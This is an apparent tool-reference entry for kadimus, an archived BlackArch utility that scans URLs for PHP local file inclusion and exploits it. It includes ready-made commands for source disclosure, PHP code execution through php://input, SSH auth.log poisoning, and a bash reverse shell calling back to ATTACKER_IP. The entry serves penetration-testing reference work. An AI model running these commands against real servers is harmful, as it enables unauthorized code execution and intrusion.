---
name: "kadimus"
categories:
  - blackarch-webapp
version: "183.ac5f438"
homepage: "https://github.com/P0cL4bs/Kadimus"
packaged-by: [blackarch]
blackarch-builddate: "2023-02-28"
build-system: make
license: MIT
meta-checked: "2026-11-09"
github-repo: "P0cL4bs/Kadimus"
github-stars: 572
github-pushed: "2020-08-17"
github-archived: true
github-issues: 7
github-match: "exact"
gh-checked: "2026-11-07"
worth: 0.6
worth-basis: "historical (archived/gone upstream)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# kadimus

> C tool that scans URL parameters for local file inclusion and exploits what it finds — source disclosure plus five LFI-to-RCE techniques including a built-in command shell.

## What it's for

kadimus checks every parameter of a URL for local file inclusion (PHP-oriented) and then exploits the finding in one binary: read source via `php://filter`, get code execution via `/proc/self/environ`, `php://input`, `data://`, `expect://` or SSH `auth.log` poisoning, drive an interactive command shell over the inclusion, or spawn a reverse shell. Proxying (SOCKS4/4a/5/5h and HTTP), custom cookies and user agents are supported for awkward targets. Upstream is archived and unmaintained, so treat it as a legacy PHP-era tool: it predates modern PHP hardening, and its techniques land only on old, misconfigured stacks (`allow_url_include`-era settings, writable log inclusion). For a modern companion see the lfi-* family in this vault ([[lfi-sploiter]], [[lfi-fuzzploit]], [[lfifreak]]).

## Typical use cases

### Scan a URL for LFI

Check all parameters of a page.

```
kadimus -u "http://target.example.com/page.php?pg=contact" -A "Mozilla/5.0"
```

Outcome: probes each parameter with inclusion payloads and reports which one is vulnerable (and the working traversal depth) — the entry point for every other mode. `-o FILE` saves the output; `-B` adds a session cookie and `--proxy socks5://127.0.0.1:9050` routes the requests.

### Disclose PHP source code

Read a file's source through `php://filter`.

```
kadimus -u "http://target.example.com/?pg=contact" -S -f "index.php%00" -O index_src.php --parameter pg
```

Outcome: `-S`/`--source` base64-decodes the filter stream for the file named by `-f` and writes the recovered source to `-O` (or stdout); the `%00` null byte is the classic truncation trick for length-limited parameters and `--parameter` names the injectable parameter.

### Execute PHP code via php://input

Run attacker-chosen code, not just read files.

```
kadimus -u "http://target.example.com/?pg=php://input%00" -C '<?php echo "pwned"; ?>' -T input
```

Outcome: `-T input` selects the `php://input` technique (requires `allow_url_include`-era settings) and `-C` supplies the PHP body, whose output appears in the response; the same `-T`/`-C` pairing works for the `environ` and `data` techniques.

### Execute commands via auth.log poisoning

Turn SSH log inclusion into command execution.

```
kadimus -u "http://target.example.com/?pg=/var/log/auth.log" -T auth -c 'id' --ssh-target target.example.com
```

Outcome: kadimus connects to the target's SSH port (`--ssh-target`, `--ssh-port` default 22) with a malicious username carrying PHP code so it lands in `/var/log/auth.log`, then includes that log through the LFI and runs `-c` system command; `-s`/`--shell` instead of `-c` drops into a simple interactive command shell driven over HTTP requests.

### Fire a reverse shell

One-shot callback through the `data://` technique.

```
kadimus -u "http://target.example.com/?pg=contact.php" -T data --parameter pg --listen --port 12345 -c '/bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/1234 0>&1"'
```

Outcome: the injected `data://` payload executes the `-c` command, connecting a shell back to ATTACKER_IP:1234 (catch it with a listener there); `--connect`/`--port` are the remote/listener controls documented in the tool's options.

No corpus evidence — derived from upstream documentation (P0cL4bs/Kadimus README: options table and examples; repo archived 2020).
